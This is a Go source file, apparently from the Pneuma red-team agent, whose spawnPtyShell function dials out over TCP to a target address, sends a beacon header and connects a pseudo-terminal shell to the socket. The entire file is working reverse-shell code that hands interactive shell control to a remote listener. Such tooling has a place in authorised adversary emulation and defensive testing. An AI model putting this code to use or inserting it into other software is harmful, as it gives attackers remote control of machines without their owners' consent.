//+build !windows,!js

package pty

import (
	"context"
	shell "github.com/creack/pty"
	"github.com/preludeorg/pneuma/commands"
	"github.com/preludeorg/pneuma/util"
	"io"
	"net"
	"os/exec"
)

func spawnPtyShell(target, executor string, agent *util.AgentConfig) (int, int, error) {
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return agent.Pid, commands.ErrorExitStatus, err
	}

	header, err := agent.BuildSocketBeacon("pty")
	if err != nil {
		return agent.Pid, commands.ErrorExitStatus, err
	}

	ctx, cancel := context.WithCancel(context.Background())
	ptyShell := exec.CommandContext(ctx, executor)
	ptmx, _ := shell.Start(ptyShell)
	go cancelOnSocketClose(cancel, conn)
	conn.Write(header)
	go func() {
		go io.Copy(ptmx, conn)
		io.Copy(conn, ptmx)
	}()
	return ptyShell.Process.Pid, commands.SuccessExitStatus, nil
}